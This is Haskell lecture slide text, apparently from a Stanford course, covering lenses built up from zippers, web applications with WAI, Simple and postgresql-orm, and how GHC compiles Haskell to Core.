The same holds for the naming of *sum* types:

.. code:: haskell

   data Sum a b c = A a
                  | B b
                  | C c

They can hold a number of values equal to:

:math:`a + b + c`

Working with nested data
========================

Suppose we’re writing a benchmarking tool. We’ll take criterion as an
example.

Measurements produce noisy samples.

The effect of outliers
======================

We want to understand how outliers in our sample data affect the sample
mean and standard deviation.

.. code:: haskell

   data OutlierEffect
       = Unaffected -- ^ Less than 1% effect.
       | Slight     -- ^ Between 1% and 10%.
       | Moderate   -- ^ Between 10% and 50%.
       | Severe     -- ^ Above 50% (i.e. measurements
                    -- are useless).

Our ``OutlierEffect`` type is embedded in another type that carries
extra information.

.. code:: haskell

   data OutlierVariance = OutlierVariance {
         ovEffect      :: OutlierEffect
       , ovDescription :: String
       , ovFraction    :: Double
       }

More nesting
============

And ``OutlierVariance`` is buried in another type.

.. code:: haskell

   data SampleAnalysis = SampleAnalysis {
         anMean       :: [Double]
       , anStdDev     :: [Double]
       , anOutlierVar :: OutlierVariance
       }

Which is nested in *yet another* type.

.. code:: haskell

   data Payload = Payload {
         sample         :: [Double]
       , sampleAnalysis :: SampleAnalysis
       , outliers       :: Outliers
       }

Accessing data is easy
======================

Even with three levels of nesting, it’s easy to access an
``OutlierEffect`` given a ``Payload``.

.. code:: haskell

   effect :: Payload -> OutlierEffect
   effect = ovEffect . anOutlierVar . sampleAnalysis

These record accessor functions are handy!

Updates, not so much
====================

OK, so suppose we want to “*modify*” an ``OutlierEffect`` buried in a
``Payload``.

.. code:: haskell

   editEffect :: (OutlierEffect -> OutlierEffect)
              -> Payload -> Payload
   editEffect eff payload =
       payload {
         sampleAnalysis = analysis {
           anOutlierVar = variance {
             ovEffect = eff effect
           }
         }
       }
     where analysis = sampleAnalysis payload
           variance = anOutlierVar analysis
           effect   = ovEffect variance

This is hideous! It hardly even looks like Haskell.

What was this?
==============

We just saw Haskell’s record update syntax in action.

.. code:: haskell

   setAddrZip :: Zip -> Address -> Address
   setAddrZip zip addr = addr { addrZip = zip }

This notation means:

-  Make a complete copy of the record ``addr``.

-  When copying, set the ``addrZip`` field to ``zip``.

It’s a way of “editing” a value that leaves the original unchanged, but
doesn’t require us to specify every field to copy.

It’s also a very non-composable hack, as we saw.

What we actually want
=====================

Our demands:

1. Access fields within records.

2. Compose *accesses*, so that we can inspect fields within nested
   records.

3. Update fields within records.

4. Compose *updates*, so that we can modify fields within nested
   records.

With Haskell’s record syntax, we get #1 and #2, sort of #3 (if we
squint), and #4 is hideous.

What to do?
===========

Suppose we have a pair.

.. code:: haskell

   (a,b)

We’d like to edit its second element.

.. code:: haskell

   editSnd :: (b -> c) -> (a,b) -> (a,c)
   editSnd f (a,b) = (a, f b)

Let’s refer to the fact that we’re interested in the second element
*focusing* on it.

It’s equally easy to edit the first element.

.. code:: haskell

   editFst :: (a -> c) -> (a,b) -> (c,b)
   editFst f (a,b) = (f a, b)

Holes
=====

Let’s refer to the slot we want to fill when editing a tole as a *hole*.

Here, the hole is in the second position.

.. code:: haskell

   editSnd :: (b -> c) -> (a,b) -> (a,c)
   editSnd f (a,b) = (a, f b)

And here, it’s in the first.

.. code:: haskell

   editFst :: (a -> c) -> (a,b) -> (c,b)
   editFst f (a,b) = (f a, b)

Counting holes
==============

If we drop the ``b`` from ``(a,b)``, how many values does the resulting
pseudo-type have?

.. _counting-holes-1:

Counting holes
==============

If we drop the ``b`` from ``(a,b)``, how many values does the resulting
pseudo-type have?

What if we drop ``a`` from ``(a,b)``?

.. _counting-holes-2:

Counting holes
==============

If we drop the ``b`` from ``(a,b)``, how many values does the resulting
pseudo-type have?

What if we drop ``a`` from ``(a,b)``?

If we want to drop some arbitrary field from ``(a,b,c)``, we can
represent this via a type.

.. code:: haskell

   data Hole3 a b c = AHole b c
                    | BHole a c
                    | CHole a b

.. _counting-holes-3:

Counting holes
==============

We can write the number of values of ``(x,x,x)`` as
:math:`x \times x \times
x`, or :math:`x^3`.

If we substitute ``x`` for ``a``, ``b``, and ``c`` below, how many
different values of type ``Hole3`` can there be?

.. code:: haskell

   data Hole3 a b c = AHole b c
                    | BHole a c
                    | CHole a b

.. _counting-holes-4:

Counting holes
==============

We can write the number of values of ``(x,x,x)`` as
:math:`x \times x \times
x`, or :math:`x^3`.

If we substitute ``x`` for ``a``, ``b``, and ``c`` below, how many
different values of type ``Hole3`` can there be?

.. code:: haskell

   data Hole3 x x x = AHole x x
                    | BHole x x
                    | CHole x x

Hmm, that’s :math:`3x^2`.

Does this remind you of symbolic differentiation?

Back to pairs
=============

Here’s a hole type for pairs.

.. code:: haskell

   data PairHole a b = HoleFst b
                     | HoleSnd a

If we pull a value out of the hole, we need to store it somewhere so we
can work with it.

.. code:: haskell

   data PairZipper a b c = PZ c (PairHole a b)

Why do we have an extra type parameter ``c``?

-  So we can choose what type of value to store in the hole later.

Quick exercise
==============

Please provide bodies for the two undefined functions below.

You have one minute.

.. code:: haskell

   data PairHole a b = HoleFst b
                     | HoleSnd a

   data PairZipper a b c = PZ c (PairHole a b)

   focusFst :: (a,b) -> PairZipper a b a
   focusFst = undefined

   focusSnd :: (a,b) -> PairZipper a b b
   focusSnd = undefined

Skeleton: http://cs240h.scs.stanford.edu/Hole1.hs

My solution
===========

.. code:: haskell

   data PairHole a b = HoleFst b
                     | HoleSnd a

   data PairZipper a b c = PZ c (PairHole a b)

   focusFst :: (a,b) -> PairZipper a b a
   focusFst (a,b) = PZ a (HoleFst b)

   focusSnd :: (a,b) -> PairZipper a b b
   focusSnd (a,b) = PZ b (HoleSnd a)

A nice thing about this?

-  The polymorphism forces there to be only one possible implementation.

The inverse conversion
======================

We obviously also need to be able to convert from a zipper back to a
pair.

.. code:: haskell

   unfocusFst :: PairZipper a b a -> (a,b)
   unfocusFst (PZ a (HoleFst b)) = (a,b)

   unfocusSnd :: PairZipper a b b -> (a,b)
   unfocusSnd (PZ b (HoleSnd a)) = (a,b)

Accessing the focused value
===========================

Now that we have focus functions to get the first or second element of a
pair, we can write a generic accessor function for our zipper type.

.. code:: haskell

   view :: PairZipper a b c -> c
   view (PZ c _) = c

Try in ``ghci``:

.. code:: haskell

   >>> view (focusFst ("hello",1))
   "hello"
   >>> view (focusSnd ("hello",1))
   1

Editing the focused value
=========================

This is the more fun part.

.. code:: haskell

   over :: (c -> c)
        -> PairZipper a b c
        -> PairZipper a b c
   over f (PZ c l) = PZ (f c) l

Once again in ``ghci``:

.. code:: haskell

   >>> unfocusSnd . over succ . focusSnd $ ("hello",1::Int)
   ("hello",2)

Editing part deux
=================

What will this print in ``ghci``?

.. code:: haskell

   >>> unfocusFst . over length . focusFst $ ("hello",1::Int)

.. _editing-part-deux-1:

Editing part deux
=================

What will this print in ``ghci``?

.. code:: haskell

   >>> unfocusFst . over length . focusFst $ ("hello",1::Int)

It’s a type error! ``over`` is not polymorphic enough.

Bad version:

.. code:: haskell

   over :: (c -> c)
        -> PairZipper a b c
        -> PairZipper a b c
   over f (PZ c l) = PZ (f c) l

The good version allows editing to change the type of the field being
edited:

.. code:: haskell

   over :: (c -> d)
        -> PairZipper a b c
        -> PairZipper a b d
   over f (PZ c l) = PZ (f c) l

Hmm
===

This approach has problems.

We have to specify what field we’re focusing at both ends of the
“pipeline”.

-  This is repetitive.

Can we compose these so that we can ‘focusFst’ then ‘focusSnd’ to get
another zipper?

-  No.

Gluing things together
======================

Instead of keeping ``focusFst`` and ``unfocusFst`` separate and wiring
them together by hand, let’s manage them automatically.

.. code:: haskell

   data Focused t a b = Focused {
       focused :: a
     , rebuild :: b -> t
     }

A ``Focused`` is a pair consisting of:

-  The focused element

-  A function that knows how to reconstitute the original value

.. code:: haskell

   type Focuser s t a b = s -> Focused t a b

A ``Focuser`` is a function that takes a value and gives us a
``Focused``.

Why so polymorphic?
===================

Recall that our original definition of ``over`` wasn’t polymorphic
enough.

We could not change the type of the first element while editing a pair.

.. code:: haskell

   >>> unfocusFst . over length . focusFst $ ("hello",1::Int)

Well, ``Focused`` and ``Focuser`` have so many type parameters to give
exactly this generality.

Another look
============

.. code:: haskell

   data Focused t a b = Focused {
       focused :: a
     , rebuild :: b -> t
     }

``Focused`` is in effect saying:

-  I am focusing on an ``a``

-  I might change its type to ``b``

-  When I am eventually done focusing, I will give you back a ``t``
   (which is ``s`` with every ``a`` replaced with ``b``)

.. _another-look-1:

Another look
============

.. code:: haskell

   type Focuser s t a b = s -> Focused t a b

The “meaning” of ``Focuser`` is:

-  You give me an ``s``

-  I will focus on an ``a``

-  I might change its type to ``b``

-  When I’m done focusing, I might change the thing I give you back from
   ``s`` to ``t`` (once again ``s`` with every ``a`` replaced with
   ``b``)

Some machinery
==============

Functions for working with these types:

.. code:: haskell

   unfocus :: Focused s a a -> s
   unfocus (Focused focused rebuild) = rebuild focused

   view :: Focuser s t a b -> s -> a
   view l s = focused (l s)

   over :: Focuser s t a b -> (a -> b) -> s -> t
   over l f s = let Focused focused rebuild = l s
                in rebuild (f focused)

Our friends ``focusFst`` and ``focusSnd`` recast in this framework:

.. code:: haskell

   _1 :: Focuser (a,b) (c,b) a c
   _1 (a,b) = Focused a (\c -> (c,b))

   _2 :: Focuser (a,b) (a,c) b c
   _2 (a,b) = Focused b (\c -> (a,c))

Your turn
=========

Here’s your scaffolding:

.. code:: haskell

   data Focused t a b = Focused {
       focused :: a
     , rebuild :: b -> t
     }

   type Focuser s t a b = s -> Focused t a b

Take two minutes to implement this:

.. code:: haskell

   focusHead :: Focuser [a] [a] a a
   focusHead = undefined

It should focus on the head of a list, such that we can run this in
``ghci``:

.. code:: haskell

   >>> over focusHead toUpper "anita"
   "Anita"

Skeleton: http://cs240h.scs.stanford.edu/Focus.hs

Abstracting again
=================

Our two most interesting functions have a lot in common.

.. code:: haskell

   over :: Focuser s t a b -> (a -> b) -> s -> t
   view :: Focuser s t a b             -> s -> a

How could we unify these types?

-  By using abstraction to decide what type to use.

.. code:: haskell

   wat :: Focuser s t a b -> (a -> f b) -> s -> f t

Type-level fun
==============

Here, ``f`` is a type-level function.

.. code:: haskell

   wat :: Focuser s t a b -> (a -> f b) -> s -> f t

If we supply the type-level identity function, ``f`` disappears and we
get out the type of ``over``:

.. code:: haskell

   wat  :: Focuser s t a b -> (a -> f b) -> s -> f t
   over :: Focuser s t a b -> (a ->   b) -> s ->   t

With the type-level ``const a`` function, we get the type of ``view``:

.. code:: haskell

   wat  :: Focuser s t a b -> (a -> f b) -> s -> f t
   view :: Focuser s t a b {- ignored -} -> s -> a

Type-level identity
===================

Defined in
```Data.Functor.Identity`` <http://hackage.haskell.org/package/transformers/docs/Data-Functor-Identity.html>`__:

.. code:: haskell

   newtype Identity a = Identity { runIdentity :: a }

   instance Functor Identity where
       fmap f (Identity a) = Identity (f a)

Type-level const
================

Defined in
```Control.Applicative`` <http://hackage.haskell.org/package/base/docs/Control-Applicative.html#v:Const>`__:

.. code:: haskell

   newtype Const a b = Const { getConst :: a }

   instance Functor (Const a) where
       fmap _ (Const v) = Const v

Our final type
==============

.. code:: haskell

   {-# LANGUAGE RankNTypes #-}

   type Lens s t a b = forall f. Functor f =>
                       (a -> f b) -> s -> f t

From our perspective as lens library writers:

We use ``forall`` here to make it clear that *we control* the
``Functor`` we use, not our caller.

We choose ``Identity`` or ``Const a`` to get the right types for
``over`` and ``view``.

.. _our-final-type-1:

Our final type
==============

.. code:: haskell

   {-# LANGUAGE RankNTypes #-}

   type Lens s t a b = forall f. Functor f =>
                       (a -> f b) -> s -> f t

From our perspective as lens library writers:

We have to explain this type to users.

-  Give me an ``s``, and I will focus on its elements of type ``a``

-  If you use ``over`` to edit, you can change those ``a`` types to
   ``b``

-  Once you’re done editing, you’ll get back a ``t``, which (if you
   didn’t change ``a`` to ``b``) will be ``s``

New machinery
=============

.. code:: haskell

   {-# LANGUAGE RankNTypes #-}

   import Control.Applicative
   import Data.Functor.Identity

   type Lens s t a b = forall f. Functor f =>
                       (a -> f b) -> s -> f t

   over :: Lens s t a b -> (a -> b) -> s -> t
   over l f s = runIdentity (l (Identity . f) s)

   view :: Lens s t a b -> s -> a
   view l s = getConst (l Const s)

Tuple sections
==============

If we turn on this:

.. code:: haskell

   {-# LANGUAGE TupleSections #-}

And write this:

.. code:: haskell

   (a,)

It’s equivalent to this:

.. code:: haskell

   \b -> (a,b)

More machinery
==============

.. code:: haskell

   {-# LANGUAGE TupleSections #-}

   _1 :: Lens (a,b) (c,b) a c
   _1 f (a,b) = (,b) <$> f a

   _2 :: Lens (a,b) (a,c) b c
   _2 f (a,b) = (a,) <$> f b

   _head :: Lens [a] [a] a a
   _head f (a:as) = (:as) <$> f a

Composing access
================

In ``ghci``:

.. code:: haskell

   >>> view (_1 . _head) ("foo",True)
   'f'

Why is this different from the traditional order of composition?

.. code:: haskell

   >>> (head . fst) ("foo",True)
   'f'

Composition of lenses
=====================

What is a lens even *for*?

-  It turns an action on a *part* of a structure into an action on the
   *whole* structure.

Thus:

-  ``_1`` and ``_2`` are *not* “just getters”, they take an *entire
   pair* and focus on its first or second element.

-  It’s ``view`` and ``over`` that then determine getter-or-setter
   nature.

What does it then mean to compose lenses?

If you write ``_1 . _head``, you are:

-  Taking the entire pair, and focusing on its first element

-  Taking the entire pair, and focusing on the head of the list *inside
   the first element of the pair*

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/a88.jpg

Composing modifications
=======================

Let’s work out how we would use the lens machinery to give us a pair
with an uppercased first name.

.. code:: haskell

   ("anita", True)

1: Why are lenses composable?
=============================

At first glance, it’s hard to tell why ``_1 . _head`` even typechecks:

.. code:: haskell

   _1    :: Functor f => (a -> f c) -> (a, b) -> f (c, b)
   _head :: Functor f => (a -> f a) -> [a] -> f [a]

And especially—why can we compose using ``.`` for function composition?

.. _why-are-lenses-composable-1:

2: Why are lenses composable?
=============================

The key: remembering that a function of 2 arguments is really a function
of 1 arg that returns a function.

.. code:: haskell

   _1 :: Functor f =>
         (a -> f c) ->
         ((a, b) -> f (c, b))

   _head :: Functor f =>
            (a -> f a) ->
            ([a] -> f [a])

   _1._head :: Functor f =>
               (a -> f a) ->
               ([a], b) -> f ([a], b)

What next?
==========

The best place to start is with the gateway drug:

-  The `lens-family-core
   package <http://hackage.haskell.org/package/lens-family-core>`__ is
   the easiest to learn

-  Also has the easiest source to read: highly recommended!

The full monty:

-  The `lens package <http://lens.github.io/>`__ is *way* more powerful,
   more abstract, more difficult to learn

-  A little controversial due to being huge

Becoming more widely used in practice:

-  My `wreq HTTP library <http://www.serpentine.com/wreq>`__

Spotter’s guide to lens operators
=================================

``^.`` is ``view`` (think “getter”)

``%~`` is ``over`` (think “editor”)

``.~`` is ``over`` – but accepts a *value* instead of a *function*
(think “setter”)

``&`` is just ``$`` with arguments flipped

Used as follows:

.. code:: haskell

   foo & someField %~ ('a':)
       & otherField .~ 'b'

(“Thing being modified, followed by modifiers in a chain.”)


/L14 WEB
================

If you want to follow along on your laptop towards the end:

-  For ghc-7.6:

.. code:: bash

   $ cabal install simple wai-handler-devel

-  For ghc-7.8

.. code:: bash

   $ git clone git://github.com/alevy/simple.git
   $ git clone git://github.com/alevy/postgresql-orm.git
   $ cd simple
   $ cabal install
   $ cd ../postgresql-orm
   $ cabal install
   $ cabal install wai-handler-devel

You’ll also need to have PostgreSQL installed

Agenda
======

1. Intro/motivation

2. Modeling a web application in Haskell

3. Build a content management system

Why should you care about web programming?
==========================================

   -  The WWW is starting to get *pretty* popular

..

   -  If you building something, there’s a good chance you’ll deploy as
      a web app the internet

   -  Even if your application doesn’t seem very “webby”

..

   -  HTTP becoming prevelent general-purpose protocol for APIs (both
      internal and external)
   -  Good client support
   -  Good server-side support (frameworks, SSL, virtual domains…)
   -  Easy to “sell” to management

How do you people write a web app?
==================================

-  Actually, that depends…

-  A busy space of frameworks

-  Used to be dominated by Java

   -  terms like “Java Servlet Container”, “J2EE”, “Enterprise Java
      Beans”, “POJO”

   -  everybody had a really bad experience with that in the late
      90s/early 2Ks

   -  Java is still the primary server-side language for, e.g. Google,
      Amazon

-  The cool kids are mostly using dynamic languages

   -  Ruby/Ruby on Rails/Sinatra

   -  Python/Django

   -  node.js/express

   -  PHP

   -  etc…

Web Programming - Most Popular Language Today?
==============================================

. . .

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/popular-web-lang.png

But why dynamic languages?
==========================

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/zoolander.jpg

.. _but-why-dynamic-languages-1:

But why dynamic languages?
==========================

Less verbose
------------

e.g. no type declerations

.. code:: ruby

   x = 123

   def incr(y)
     y + 1
   end

vs

.. code:: java

   protected static int x = 123;

   public static int incr(int y) {
     return y + 1;
   }

.. _but-why-dynamic-languages-2:

But why dynamic languages?
==========================

Advanced features
-----------------

like closures

.. code:: java

   Array.map(myarr, new Runnable() {
     public void run(int elm) {
       return elm * 42;
     }
   })

vs.

.. code:: ruby

   myarr.map {|elm| elm * 42}

.. _but-why-dynamic-languages-3:

But why dynamic languages?
==========================

Other less compelling reasons
-----------------------------

-  Fast development and prototyping

-  Dynamic language GOOD because *dynamic* web sites!

..

   | “When rendering web pages, often you have very many components
     interacting on a web page. You have buttons over here and little
     widgets over there and there are dozens of them on a webpage, as
     well as possibly dozens or hundreds of web pages on your website
     that are all **dynamic**. […] using a statically typed language is
     actually quite inflexible. […] like the whole system has to type
     check just to be able to move a button around”
   | - Nick Kallen from Twitter

Is it really about dynamism?
============================

No type declerations (but still typed)
--------------------------------------

.. code:: haskell

   x = 123 -- :: Num a => a

   incr y = y + 1 -- :: Num a => a -> a

Closures
--------

.. code:: haskell

   map (* 42) myarr

A lot of the arguments are really about weaknesses in Java et al.
-----------------------------------------------------------------

Modeling a web application in Haskell
=====================================

-  Claim: a web application does three things:

   1. parses a request from the client
   2. performs some side effects (e.g. reading/writing to a database)
   3. generates some response for the client

-  Given the following two types:

   .. code:: haskell

      data Request = Request {pathInfo :: [String], requestMethod :: Method, ...}

      data Response = Response Status [Header] String

-  Fill in the type for an ``Application``:

   .. code:: haskell

      type Application = ...

Boilerplate code:
`http://cs240h.scs.stanford.edu/Application.hs <Application.hs>`__

.. _modeling-a-web-application-in-haskell-1:

Modeling a web application in Haskell
=====================================

::

   ```haskell
   data Request = Request {pathInfo :: [String], requestMethod :: Method, ...}

   data Response = Response Status [Header] String

   type Application = Request -> IO Response
   ```

We’ve just implemented the WAI package – “Web Application Interface”!
---------------------------------------------------------------------

The WAI package
===============

-  Common interface between servers and applications so you can
   mix-and-match

-  Servers:

   -  warp
   -  FastCGI
   -  wai-handler-devel (for development)

-  App frameworks:

   -  Yesod
   -  Scotty
   -  Hails (shameless plug)
   -  Simple (shameless plug)
   -  Others through adapters

.. _the-wai-package-1:

The WAI package
===============

.. code:: haskell

   data Request = Request {
        requestMethod        :: Method
     ,  httpVersion          :: HttpVersion
     ,  rawPathInfo          :: ByteString
     ,  rawQueryString       :: ByteString
     ,  requestHeaders       :: RequestHeaders
     ,  isSecure             :: Bool
     ,  remoteHost           :: SockAddr
     ,  pathInfo             :: [Text]
     ,  queryString          :: Query
     ,  requestBody          :: Source IO ByteString
     ,  vault                :: Vault
     ,  requestBodyLength    :: RequestBodyLength
     ,  requestHeaderHost    :: Maybe B.ByteString
     ,  requestHeaderRange   :: Maybe B.ByteString
     }

   data Response
       = ResponseFile Status ResponseHeaders FilePath (Maybe FilePart)
       | ResponseBuilder Status ResponseHeaders Builder
       | ResponseSource Status ResponseHeaders (forall b. WithSource IO (C.Flush Builder) b)
       | ResponseRaw (forall b. WithRawApp b) Response

   type Application = Request -> IO Response

A really simple application
===========================

Let’s build the simplest application that displays something in a
browser

-  First install ``wai`` and ``warp``:

.. code:: bash

   $ cabal install wai warp

-  Finally, build the app!

.. code:: haskell

   module Main where

   import qualified Data.ByteString.Lazy.Char8 as L8
   import Network.HTTP.Types
   import Network.Wai
   import Network.Wai.Handler.Warp (run)

   app :: Application
   app req = return $ responseLBS status200 [] $ L8.pack "Hello, World"

   main :: IO ()
   main = do
     run 3000 app

..

   -  Demo Time!

Let’s build a CMS!
==================

1. (Very) quick intro to *Simple*

2. (Very) quick intro to *postgresql-orm*

3. Write some code

*Simple* - a web framework in Haskell
=====================================

*Simple* is a web framework with one type:

.. code:: haskell

   newtype Controller s a = Controller {
     runController :: s -> Request -> IO (Either Response a, s)
     }

   instance Monad Controller
   instance Applicative Controller
   instance MonadIO Controller

-  Very small wrapper around WAI’s ``Application`` type

-  Let’s us refer to the ``Request`` anywhere without passing it around

-  Let’s us refer to some application state anywhere without passing it
   around

-  Let’s us decide we’re ready to respond and stop computing

Some *Simple* combinators
=========================

-  Stop computing and respond to a request:

.. code:: haskell

   respond :: Response -> Controller s a
   okHtml :: ByteString -> Response
   notFound :: Response

   respond $ okHtml "Hello world"

-  Get the request and app state:

.. code:: haskell

   request :: Controller s Request
   controllerState :: Controller s s

-  Parse query and form parameters:

.. code:: haskell

   queryParam' :: Parseable p => Controller s p
   parseForm :: Controller s ([Param], (ByteString, FileInfo ByteString))

.. _some-simple-combinators-1:

Some *Simple* combinators
=========================

-  Routing combinators:

.. code:: haskell

   -- Match on next dir in path
   routeName :: Text -> Controller s () -> Controller s ()
   routeName "articles" $ ...

   -- Treat first dir in path as query param
   routeVar :: Text -> Controller s () -> Controller s ()
   routeName "articles" $ routeVar "name" $ ...

   -- Match whole pattern of path
   routePattern :: Text -> Controller s () -> Controller s ()
   routePattern "/articles/:name" $ ...

   -- Match if no path left
   routeTop :: Controller s () -> Controller s ()

   -- Match on request method
   routeMethod :: Method -> Controller s () -> Controller s ()
   routeMethod GET $ routePatter "/articles/:name"

   -- Match hostname
   routeHost :: ByteString -> Controller s () -> Controller s ()

Higher-level *Simple* combinators
=================================

Common case is to match on method and a particular path pattern:

.. code:: haskell

   get :: Text -> Controller s () -> Controller s ()
   get ptrn ctrl = routeMethod GET $ routePattern ptrn ctrl

   post :: Text -> Controller s () -> Controller s ()
   post ptrn ctrl = routeMethod POST $ routePattern ptrn ctrl

So a typical small app might look like:

.. code:: haskell

   myapp :: Controller s ()
   myapp = do
     get "/" $ respond $ okHtml "Hello World"
     get "/foo" $ respond $ okHtml "bar"

PostgreSQL ORM
==============

-  Object relational mapper (ORM)

   -  maps from native types to SQL
   -  In our case maps to PostgreSQL flavored SQL

-  Haskell types must be of the form:

.. code:: haskell

   data Article = Article
     { articleId :: DBKey
     , articleTitle :: Text
     , articleBody :: Text
     , articleShortName :: Text }

-  Instances of the ``Model`` class:

.. code:: haskell

   class Model a where
     modelInfo :: ModelInfo a
     modelRead :: RowParser a
     modelWrite :: a -> [Action]

   data DBKey = DBKey !Int64 | NullKey

   data ModelInfo a = ModelInfo {
       modelTable :: ByteString
     , modelColumns :: [ByteString]
     , modelPrimaryColumn :: Int
     , modelGetPrimaryKey :: a -> DBKey }

.. _postgresql-orm-1:

PostgreSQL ORM
==============

-  If the ``Model`` derives ``Generic`` we don’t need to write an
   implementation

.. code:: haskell

   {-# LANGUAGE DeriveGeneric #-}
   import GHC.Generics

   data Article = Article
     { articleId :: DBKey
     , articleTitle :: Text
     , articleBody :: Text
     , articleShortName :: Text } deriving (Show, Generic)

   instance Model Article

-  This gives us access to:

.. code:: haskell

   save :: Model a => Connection -> a -> IO ()
   findAll :: Model a => Connection -> IO [a]
   findRow :: Model a => Connection -> DBRef a -> IO (Maybe a)

-  Because we’re in Haskell, let’s us avoid a bunch of edge cases:

   -  Fields cannot be null (unless they are a ``Maybe``)
   -  Fields cannot be different types (unless they are an ``Either``)
   -  Validation because redundant in many cases

OK, let’s get to coding:
========================

.. code:: bash

   $ cabal install simple
   $ smpl create my_cms



/L15 Haskell Compiler
=======================

Why understand how GHC works?
=============================

-  Understand Core & STG – performance.
-  Familiarity with functional terminology.
-  Understand execution model – reasonable cost model.

The pipeline of GHC
===================

Haskell -> GHC Haskell -> Core -> STG -> Cmm -> Assembly


GHC supports Haskell on top of an unsafe variant
================================================

Primitive types (GHC.Prim):

-  Char#, Int#, Word#, Double#, Float#
-  Array#, ByteArray#, ArrayArray#,
-  MutVar#, TVar#, MVar#
-  State#, exceptions

All primitive types are *unlifted* – can’t contain :math:`\bot`.

.. _ghc-supports-haskell-on-top-of-an-unsafe-variant-1:

GHC supports Haskell on top of an unsafe variant
================================================

All variants of Int (In8, Int16, Int32, Int64) are represented
internally by Int# (64bit) on a 64bit machine.

.. code:: haskell

   data Int32 = I32# Int# deriving (Eq, Ord, Typeable)

   instance Num Int32 where
       (I32# x#) + (I32# y#)  = I32# (narrow32Int# (x# +# y#))
       ...

Data constructors *lift* a type, allowing :math:`\bot`.

GHC implements IO through the RealWorld token
=============================================

-  IO Monad is a state passing monad.

.. code:: haskell

   newtype IO a = IO (State# RealWorld -> (# State# RealWorld, a #))

   returnIO :: a -> IO a
   returnIO x = IO $  s -> (# s, x #)

   bindIO :: IO a -> (a -> IO b) -> IO b
   bindIO (IO m) k = IO $  s -> case m s of (# new_s, a #) -> unIO (k a) new_s

-  ``RealWorld`` token enforces ordering through data dependence.

.. code:: haskell

   unsafePerformIO :: IO a -> a
   unsafePerformIO m = unsafeDupablePerformIO (noDuplicate >> m)

   unsafeDupablePerformIO  :: IO a -> a
   unsafeDupablePerformIO (IO m) = lazy (case m realWorld# of (# _, r #) -> r)

-  Various unsafe functions throw away ``RealWorld`` token.

Core: a small function intermediate language
============================================

-  Idea: map Haskell to a small lanuage for easier optimization and
   compilation.

-  Functional lazy language

-  It consists of only a hand full of constructs!

::

   variables, literals, let, case, lambda abstraction, application

-  In general think, ``let`` means allocation, ``case`` means
   evaluation.

Core in one slide
=================

.. code:: haskell

   data Expr b -- "b" for the type of binders, 
     = Var    Id
     | Lit   Literal
     | App   (Expr b) (Arg b)
     | Lam   b (Expr b)
     | Let   (Bind b) (Expr b)
     | Case  (Expr b) b Type [Alt b]

     | Type  Type
     | Cast  (Expr b) Coercion
     | Coercion Coercion

     | Tick  (Tickish Id) (Expr b)

   data Bind b = NonRec b (Expr b)
               | Rec [(b, (Expr b))]

   type Arg b = Expr b

   type Alt b = (AltCon, [b], Expr b)

   data AltCon = DataAlt DataCon | LitAlt  Literal | DEFAULT

Lets now look at how Haskell is compiled to 
`Core <http://hackage.haskell.org/trac/ghc/wiki/Commentary/Compiler/CoreSynType>`__.

GHC Haskell to Core: monomorphic functions
==========================================

Haskell 

.. code:: haskell

   idChar :: Char -> Char
   idChar c = c

Core 

.. code:: haskell

   idChar :: GHC.Types.Char -> GHC.Types.Char
   [GblId, Arity=1, Caf=NoCafRefs]
   idChar =  (c :: GHC.Types.Char) -> c

GHC Haskell to Core: polymorphic functions
==========================================

Haskell 

.. code:: haskell

   id :: a -> a
   id x = x

   idChar2 :: Char -> Char
   idChar2 = id

Core 

.. code:: haskell

   id :: forall a. a -> a
   id =  (@ a) (x :: a) -> x

   idChar2 :: GHC.Types.Char -> GHC.Types.Char
   idChar2 = id @ GHC.Types.Char

.. raw:: html

   <!--
   * [GblId...] specifies various metadata about the function
   * Functions are all lambda abstractions
   * Explicit passing and instantiation of type variables
       * type variables are proceeded by @ symbol (read them as 'at type
         ...')
       * they are passed abstracted and passed around just like value
         variables
       * this is known as second order lambda calculus
       * GHC uses this representation because it makes preserving type
         information during optimization easy
   -->

.. _ghc-haskell-to-core-polymorphic-functions-1:

GHC Haskell to Core: polymorphic functions
==========================================

Haskell 

.. code:: haskell

   map :: (a -> b) -> [a] -> [b]
   map _ []     = []
   map f (x:xs) = f x : map f xs

Core 

.. code:: haskell

   map :: forall a b. (a -> b) -> [a] -> [b]
   map =  (@ a) (@ b) (f :: a -> b) (xs :: [a]) ->
       case xs of _ {
         []     -> GHC.Types.[] @ b;
         : y ys -> GHC.Types.: @ b (f y) (map @ a @ b f ys)
       }

.. 
   * case statements are only place evaluation happens, read them as
     'evaluate'
       * they take an extra variable just after `of` that captures the
         return value of the scrutinee
   * names are fully qualified

New case syntax to make obvious that evaluation is happening:

.. code:: haskell

   case e of result {
     __DEFAULT -> result
   }

Where transformed to let
========================

Haskell 

.. code:: haskell

   dox :: Int -> Int
   dox n = x * x
       where x = n + 2

Core 

.. code:: haskell

   dox :: GHC.Types.Int -> GHC.Types.Int
   dox =  (n :: GHC.Types.Int) ->
       let {
         x :: GHC.Types.Int
         x = GHC.base.plusInt n (GHC.Types.I# 2)
       }
       in GHC.base.multInt x x

Patterns matching transformed to case statements
================================================

Haskell 

.. code:: haskell

   iff :: Bool -> a -> a -> a
   iff True  x _ = x
   iff False _ y = y

Core 

.. code:: haskell

   iff :: forall a. GHC.Bool.Bool -> a -> a -> a
   iff =  (@ a) (d :: GHC.Bool.Bool) (x :: a) (y :: a) ->
       case d of _
         GHC.Bool.False -> y
         GHC.Bool.True  -> x

Type classes transformed to dictionaries
========================================

Haskell 

.. code:: haskell

   typeclass MyEnum a where
      toId  :: a -> Int
      fromId :: Int -> a

Core 

.. code:: haskell

   data MyEnum a = DMyEnum (a -> Int) (Int -> a)

   toId :: forall a. MyEnum a => a -> GHC.Types.Int
   toId =  (@ a) (d :: MyEnum a) (x :: a) ->
       case d of _
         DMyEnum f1 _ -> f1 x

   fromId :: forall a. MyEnum a => GHC.Types.Int -> a
   fromId =  (@ a) (d :: MyEnum a) (x :: a) ->
       case d of _
         DMyEnum _ f2 -> f2 x

.. raw:: html

   <!--
   * Typeclasses are implemented via _dictionaries_
       * Just a data structure storing the various functions for each field
       * Functions that have type class constraints take an extra dictionary argument
       * GHC will optimize away this dictionary passing when it can
   -->

A dictionary constructed for each instance
==========================================

Haskell 

.. code:: haskell

   instance MyEnum Int where
      toId = id
      fromId = id

Core 

.. code:: haskell

   fMyEnumInt :: MyEnum GHC.Types.Int
   fMyEnumInt =
       DMyEnum @ GHC.Types.Int
         (id @ GHC.Types.Int)
